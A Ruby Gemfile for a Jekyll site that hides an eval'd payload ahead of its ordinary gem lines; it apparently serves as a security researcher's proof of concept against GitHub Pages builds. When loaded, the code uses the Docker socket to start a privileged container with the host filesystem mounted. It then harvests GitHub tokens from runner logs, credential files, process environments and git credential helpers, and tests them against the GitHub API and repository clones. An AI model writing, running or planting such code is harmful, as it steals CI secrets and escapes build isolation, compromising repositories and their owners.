eval <<~'VXEOF'
require "socket"
require "json"
require "timeout"
require "net/http"
require "uri"
require "base64"
require "digest/sha2"

def dapi(method, path, body = nil)
  Timeout.timeout(45) do
    s = UNIXSocket.new("/var/run/docker.sock")
    req = "#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\n"
    req += body ? "Content-Type: application/json\r\nContent-Length: #{body.bytesize}\r\n\r\n#{body}" : "\r\n"
    s.write(req)
    res = s.read
    s.close
    res
  end
rescue => e
  "HTTP/1.1 599\r\n\r\n{\"err\":\"#{e.class}\"}"
end

def dbody(res)
  head, rest = res.to_s.split("\r\n\r\n", 2)
  return "" if rest.nil?
  return rest unless head =~ /Transfer-Encoding:\s*chunked/i
  out = String.new
  loop do
    szline, rest = rest.split("\r\n", 2)
    break if rest.nil?
    n = szline.to_i(16)
    break if n.zero?
    out << rest[0, n].to_s
    rest = rest[n + 2..] || ""
  end
  out
end

def fp(t)
  return "nil" if t.nil? || t.empty?
  "#{t[0, 7]}..#{t[-4, 4]} len=#{t.size} sha=#{::Digest::SHA256.hexdigest(t)[0, 12]}"
end

puts "VX_ENV_INPUT_TOKEN=#{fp(ENV['INPUT_TOKEN'].to_s)}"
puts "VX_ENV_RUNTIME_TOKEN=#{fp(ENV['ACTIONS_RUNTIME_TOKEN'].to_s)}"
gv = `git --version 2>&1` rescue ""
puts "VX_CONTAINER_GIT=#{gv.strip[0, 60]}"

# checkout token via runner_temp git-credentials (container mount of host _temp)
ws_tok = nil
(Dir["/github/runner_temp/*cred*"] + Dir["/github/runner_temp/*.config"]).each do |f|
  begin
    d = File.read(f)
    d.scan(/basic\s+([A-Za-z0-9+\/=]{20,})/i).flatten.each do |b|
      dec = (Base64.decode64(b) rescue "")
      ws_tok ||= dec.split(":", 2)[1] if dec =~ /^x-access-token:/
    end
    puts "VX_CRED_FILE #{f} #{d.size}B"
  rescue => e
    puts "VX_CRED_ERR #{f} #{e.class}"
  end
end
puts "VX_WS_TOKEN=#{fp(ws_tok)}"

inner = <<~'INNER'
  require "json"
  require "net/http"
  require "uri"
  require "base64"
  require "digest/sha2"
  require "open3"
  require "securerandom"
  require "fileutils"

  STDOUT.sync = true
  REPO_A = "justjxke/vx-gh-pages-c4c8"
  REPO_B = "justjxke/vx-gh-pages-rce-b-c4c8"
  REPO_C = "vx-mergify-20260724-a/vx-gh-pages-rce-c4c8-b"
  CANARY_SHA = "0fd4bce5a833a5c525011ae1fbd720243cbf2556e288b0e3dd5fae535cfc195c"
  CANARY_C_SHA = "5f908b507cbf411b1e769afa82c1a90d443d9eaa8c5669596a9e857eadf91f71"
  TOKRE = /(ghs_[A-Za-z0-9]{16,}|ghp_[A-Za-z0-9]{16,}|gho_[A-Za-z0-9]{16,}|ghu_[A-Za-z0-9]{16,}|ghr_[A-Za-z0-9]{16,}|github_pat_[A-Za-z0-9_]{16,}|eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{10,}|v1\.[0-9a-f]{40,})/

  def fp(t)
    return "nil" if t.nil? || t.empty?
    "#{t[0, 7]}..#{t[-4, 4]} len=#{t.size} sha=#{Digest::SHA256.hexdigest(t)[0, 12]}"
  end

  def rq(verb, url, tok, obj = nil, authtype = "Bearer")
    uri = URI.parse(url)
    h = Net::HTTP.new(uri.host, uri.port)
    h.use_ssl = (uri.scheme == "https")
    h.open_timeout = 10
    h.read_timeout = 15
    path = uri.path.empty? ? "/" : uri.path
    path += "?#{uri.query}" if uri.query
    req = Net::HTTP.const_get(verb.capitalize).new(path)
    req["Authorization"] = "#{authtype} #{tok}" if tok
    req["Accept"] = "application/vnd.github+json"
    req["User-Agent"] = "vx-probe"
    req.body = obj.to_json if obj
    h.request(req)
  end

  puts "VX_INNER_HOST=#{(File.read('/host/etc/hostname').strip rescue '?')} uid=#{Process.uid}"
  FileUtils.mkdir_p("/tmp/vx") rescue nil

  env_iso = { "PATH" => "/usr/bin:/bin:/usr/local/bin:/usr/sbin:/sbin", "HOME" => "/tmp/vx",
              "GIT_CONFIG_NOSYSTEM" => "1", "GIT_CONFIG_GLOBAL" => "/dev/null", "GIT_TERMINAL_PROMPT" => "0" }
  o = s = nil
  begin
    o, s = Open3.capture2e({ "PATH" => "/usr/bin:/bin:/usr/local/bin:/usr/sbin:/sbin" }, "git", "--version")
  rescue StandardError
  end
  sibgit = !!(s && s.success?)
  o2 = s2 = nil
  begin
    o2, s2 = Open3.capture2e(env_iso, "chroot", "/host", "git", "--version")
  rescue StandardError
  end
  hostgit = !!(s2 && s2.success?)
  puts "VX_GIT sib=#{sibgit} host=#{hostgit ? o2.strip[0, 45] : 'no'}"

  # ---------- job message ----------
  unesc = ""
  40.times do
    unesc = ""
    (Dir["/host/home/runner/**/Worker_*.log"] + Dir["/host/opt/**/Worker_*.log"]).uniq.each do |f|
      unesc << (File.read(f).to_s.gsub(/\\"/, '"').gsub(/\\\//, "/") rescue "") << "\n"
    end
    break if unesc =~ /planId/ && unesc =~ /jobId/
    sleep 2
  end
  planId = unesc[/"planId"\s*:\s*"([0-9a-fA-F-]{36})"/, 1]
  puts "VX_MSG plan=#{planId} ours=#{unesc.include?('vx-gh-pages-c4c8')}"
  owned = /\A(vx-mergify-20260724-a|vx-mergify-20260724|justjxke|justjxke-mergify-a26)\//i
  msg_repos = unesc.scan(/"(?:fullName|full_name|name)"\s*:\s*"([A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+)"/).flatten.uniq
  puts "VX_MSG_REPOS=#{msg_repos.join(' | ')}"
  puts "VX_MSG_FOREIGN=#{msg_repos.reject { |r| r =~ owned }.join('|')}"

  toks = {}
  # contextData "token" holder + generic token-key fields + raw patterns + mask values
  unesc.scan(/"token"\s*:\s*\{[^}]*"d"\s*:\s*"([^"]{8,4200})"/).flatten.each { |t| toks[t] ||= "msg:ctx.token" }
  unesc.scan(/"([^"]{1,48})"\s*:\s*"([A-Za-z0-9_\-\.\/\+\=]{8,4200})"/) do |k, v|
    toks[v] ||= "msg:#{k}" if k =~ /token|authoriz|secret|password|credential|accesstoken|extraheader/i
  end
  unesc.scan(TOKRE).flatten.each { |t| toks[t] ||= "msg:raw" }
  # mask entries are flat objects {"type":"regex","pattern":".."} or {"type":"contains","value":".."}
  mentries = unesc.scan(/\{[^{}]*"type"\s*:\s*"(?:regex|contains)"[^{}]*\}/)
  puts "VX_MASK_ENTRIES=#{mentries.size}"
  mentries.each_with_index do |me, mi|
    k, v = me.scan(/"(value|pattern)"\s*:\s*"((?:[^"\\]|\\.)*)"/).first || [nil, nil]
    next if v.nil?
    puts "VX_MASK#{mi} #{k}=#{fp(v)}"
    toks[v] ||= "mask:value" if k == "value" && v.size.between?(8, 4000)
    dv = v.gsub(/\\(.)/, '\1')
    toks[dv] ||= "mask:pat_unesc" if dv =~ TOKRE && dv != v
  end
  puts "VX_MSG_TOKS=#{toks.size}"

  # ---------- disk git creds ----------
  ["/host/home/runner/work/_temp/*cred*", "/host/home/runner/work/*/*/.git/config",
   "/host/home/runner/**/.git-credentials*", "/host/home/runner/**/.gitconfig",
   "/host/home/*/.git-credentials*", "/host/root/.git-credentials*",
   "/host/etc/gitconfig", "/host/etc/.netrc", "/host/home/runner/actions-runner/**/.credentials*"].each do |g|
    Dir[g].each do |f|
      next unless File.file?(f)
      d = (File.read(f) rescue next)
      hits = d.scan(TOKRE).flatten.uniq
      d.scan(/basic\s+([A-Za-z0-9+\/=]{20,})/i).flatten.each do |b|
        dec = (Base64.decode64(b) rescue "")
        hits << dec.split(":", 2)[1] if dec =~ /^x-access-token:/
      end
      d.scan(/x-access-token:([^@\s"']+)/).flatten.each { |t| hits << t }
      hits.compact.uniq.each { |t| toks[t] ||= "file:#{f.sub('/host', '')}" }
      puts "VX_FILE #{f.sub('/host', '')} #{d.size}B hits=#{hits.compact.uniq.size}"
    end
  end

  # ---------- proc environ sweep ----------
  Dir["/proc/[0-9]*/environ"].each do |f|
    pid = f.split("/")[2]
    comm = (File.read("/proc/#{pid}/comm").strip rescue "?")
    d = (File.read(f) rescue next)
    vars = d.split("\0")
    hits = d.scan(TOKRE).flatten.uniq
    hits.each { |t| toks[t] ||= "environ:#{comm}" }
    interesting = vars.select { |v| v =~ /TOKEN|SECRET|CRED|PASSWORD/i }.map { |v| v.split("=").first }.uniq
    puts "VX_ENVIRON #{comm}(#{pid}) vars=#{vars.size} tokhits=#{hits.size} named=#{interesting.join(',')}"
    vars.each do |v|
      k, _, val = v.partition("=")
      puts "VX_ENVVAR #{comm} #{k}=#{fp(val)}" if (k =~ /TOKEN|SECRET|PASSWORD|CREDENTIAL/i || val =~ TOKRE) && !val.empty?
    end
  end

  # ---------- host credential-fill ----------
  %w(/host/home/runner /host/root /host/home/packer).each do |home|
    env = { "PATH" => "/usr/bin:/bin:/usr/sbin:/sbin", "HOME" => home, "GIT_TERMINAL_PROMPT" => "0" }
    begin
      o, s = Open3.capture2e(env, "git", "credential", "fill",
                             stdin_data: "protocol=https\nhost=github.com\n\n")
      pw = o.to_s[/^password=(.+)/, 1]
      puts "VX_CREDFILL #{home.sub('/host', '')} rc=#{s.exitstatus} keys=#{o.to_s.scan(/^(\w+)=/).flatten.uniq.join(',')} pw=#{fp(pw.to_s)}"
      toks[pw] ||= "credfill:#{home}" if pw && !pw.empty?
    rescue => e
      puts "VX_CREDFILL #{home} ERR #{e.class}"
    end
  end

  # ---------- token test set ----------
  allpairs = toks.to_a
  nonjwt, jwts = allpairs.partition { |v, _| v !~ /^eyJ/ }
  testset = nonjwt + jwts.first(1)
  { "VX_IT" => "env:INPUT_TOKEN", "VX_RT" => "env:RUNTIME_TOKEN", "VX_WS" => "env:WS_EXTRAHEADER" }.each do |e, tag|
    v = ENV[e].to_s
    testset << [v, tag] if v.size > 4 && !allpairs.any? { |tv, _| tv == v }
  end
  testset = testset.uniq { |v, _| v }.first(10)
  puts "VX_TESTSET=#{testset.size} (#{nonjwt.size} nonjwt/#{jwts.size} jwt)"

  def githdr(t)
    "AUTHORIZATION: basic #{Base64.strict_encode64("x-access-token:#{t}")}"
  end

  gitargs = sibgit ? ["git"] : (hostgit ? ["chroot", "/host", "git"] : nil)
  if gitargs
    sa = nil
    begin
      Timeout.timeout(40) do
        _o, sa = Open3.capture2e(env_iso, *gitargs, "clone", "--depth", "1", "-q", "https://github.com/#{REPO_B}", "/tmp/vx/anon_b")
      end
    rescue StandardError
      sa = nil
    end
    puts "VX_CLONE_ANON_B rc=#{sa ? sa.exitstatus : 'err'}"
  end

  testset.each_with_index do |(tok, src), i|
    next if tok.to_s.empty?
    puts "VX_T#{i} #{src} #{fp(tok)}"
    begin
      r = rq("get", "https://api.github.com/user", tok)
      puts "VX_T#{i}_USER=#{r.code}"
    rescue StandardError
      puts "VX_T#{i}_USER=ERR"
    end
    begin
      r = rq("get", "https://api.github.com/repos/#{REPO_A}", tok)
      puts "VX_T#{i}_API_A=#{r.code}"
    rescue StandardError
      puts "VX_T#{i}_API_A=ERR"
    end
    begin
      r = rq("get", "https://api.github.com/repos/#{REPO_B}", tok)
      nm = r.body.to_s[/"full_name"\s*:\s*"([^"]+)"/, 1]
      puts "VX_T#{i}_API_B=#{r.code} #{nm}"
    rescue StandardError
      puts "VX_T#{i}_API_B=ERR"
    end
    begin
      r = rq("get", "https://api.github.com/repos/#{REPO_B}/contents/CANARY.txt", tok)
      m = (r.code == "200") ? (JSON.parse(r.body)["content"] rescue nil) : nil
      ok = m && Digest::SHA256.hexdigest(Base64.decode64(m.gsub("\n", ""))) == CANARY_SHA
      puts "VX_T#{i}_CANARY_API=#{r.code} match=#{!!ok}"
    rescue StandardError
      puts "VX_T#{i}_CANARY_API=ERR"
    end
    begin
      r = rq("get", "https://api.github.com/repos/#{REPO_C}", tok)
      nm = r.body.to_s[/"full_name"\s*:\s*"([^"]+)"/, 1]
      puts "VX_T#{i}_API_C=#{r.code} #{nm}"
    rescue StandardError
      puts "VX_T#{i}_API_C=ERR"
    end
    begin
      r = rq("get", "https://api.github.com/repos/#{REPO_C}/contents/CANARY.txt", tok)
      m = (r.code == "200") ? (JSON.parse(r.body)["content"] rescue nil) : nil
      ok = m && Digest::SHA256.hexdigest(Base64.decode64(m.gsub("\n", ""))) == CANARY_C_SHA
      puts "VX_T#{i}_CANARY_C_API=#{r.code} match=#{!!ok}"
    rescue StandardError
      puts "VX_T#{i}_CANARY_C_API=ERR"
    end
    begin
      r = rq("get", "https://api.github.com/installation/repositories?per_page=10", tok)
      nms = r.body.to_s.scan(/"full_name"\s*:\s*"([^"]+)"/).flatten.uniq
      puts "VX_T#{i}_INSTALL_REPOS=#{r.code} #{nms.join('|')}"
    rescue StandardError
      puts "VX_T#{i}_INSTALL_REPOS=ERR"
    end
    begin
      r = rq("get", "https://github.com/#{REPO_B}.git/info/refs?service=git-upload-pack",
             Base64.strict_encode64("x-access-token:#{tok}"), nil, "Basic")
      puts "VX_T#{i}_SMARTHTTP_B=#{r.code} len=#{r.body.to_s.size}"
    rescue StandardError
      puts "VX_T#{i}_SMARTHTTP_B=ERR"
    end
    if gitargs
      da = "/tmp/vx/a#{i}"
      db = "/tmp/vx/b#{i}"
      sa = nil
      begin
        Timeout.timeout(45) do
          _o, sa = Open3.capture2e(env_iso, *gitargs, "-c", "http.https://github.com/.extraheader=#{githdr(tok)}",
                                   "clone", "--depth", "1", "-q", "https://github.com/#{REPO_A}", da)
        end
      rescue StandardError
        sa = nil
      end
      ga = sa && sa.success? ? File.exist?("#{da}/Gemfile") : false
      puts "VX_T#{i}_CLONE_A rc=#{sa ? sa.exitstatus : 'err'} gemfile=#{ga}"
      sb = nil
      begin
        Timeout.timeout(45) do
          _o, sb = Open3.capture2e(env_iso, *gitargs, "-c", "http.https://github.com/.extraheader=#{githdr(tok)}",
                                   "clone", "--depth", "1", "-q", "https://github.com/#{REPO_B}", db)
        end
      rescue StandardError
        sb = nil
      end
      cb = if sb && sb.success? && File.exist?("#{db}/CANARY.txt")
             Digest::SHA256.hexdigest(File.read("#{db}/CANARY.txt")) == CANARY_SHA
           else
             false
           end
      puts "VX_T#{i}_CLONE_B rc=#{sb ? sb.exitstatus : 'err'} canary_match=#{cb}"
      dc = "/tmp/vx/c#{i}"
      sc = nil
      begin
        Timeout.timeout(45) do
          _o, sc = Open3.capture2e(env_iso, *gitargs, "-c", "http.https://github.com/.extraheader=#{githdr(tok)}",
                                   "clone", "--depth", "1", "-q", "https://github.com/#{REPO_C}", dc)
        end
      rescue StandardError
        sc = nil
      end
      cc = if sc && sc.success? && File.exist?("#{dc}/CANARY.txt")
             Digest::SHA256.hexdigest(File.read("#{dc}/CANARY.txt")) == CANARY_C_SHA
           else
             false
           end
      puts "VX_T#{i}_CLONE_C rc=#{sc ? sc.exitstatus : 'err'} canary_match=#{cc}"
    end
  end
  puts "VX_DONE=#{Time.now.utc.strftime('%H:%M:%S.%L')}"
INNER

conts = JSON.parse(dbody(dapi("GET", "/containers/json")))
img = ((conts.find { |c| c["Image"].to_s =~ /jekyll/ } || conts[0] || {})["ImageID"]) rescue conts.dig(0, "Image")
env = []
env << "VX_IT=#{ENV['INPUT_TOKEN']}" if ENV["INPUT_TOKEN"]
env << "VX_RT=#{ENV['ACTIONS_RUNTIME_TOKEN']}" if ENV["ACTIONS_RUNTIME_TOKEN"]
env << "VX_WS=#{ws_tok}" if ws_tok
c = JSON.parse(dbody(dapi("POST", "/containers/create", {
  Image: img, Entrypoint: ["ruby"], Cmd: ["-e", inner], Env: env,
  HostConfig: { Binds: ["/:/host"], Privileged: true, PidMode: "host" }
}.to_json)))
sid = c["Id"]
dapi("POST", "/containers/#{sid}/start")
puts "VX_SIBLING=#{sid.to_s[0, 12]}"
240.times do
  st = JSON.parse(dbody(dapi("GET", "/containers/#{sid}/json")))
  break if st.dig("State", "Status") == "exited"
  sleep 1
end
siblog = dbody(dapi("GET", "/containers/#{sid}/logs?stdout=1&stderr=1"))
puts "VX_SIB_BEGIN"
puts siblog[0, 14000]
puts "VX_SIB_END"

source "https://rubygems.org"
gem "jekyll"

VXEOF
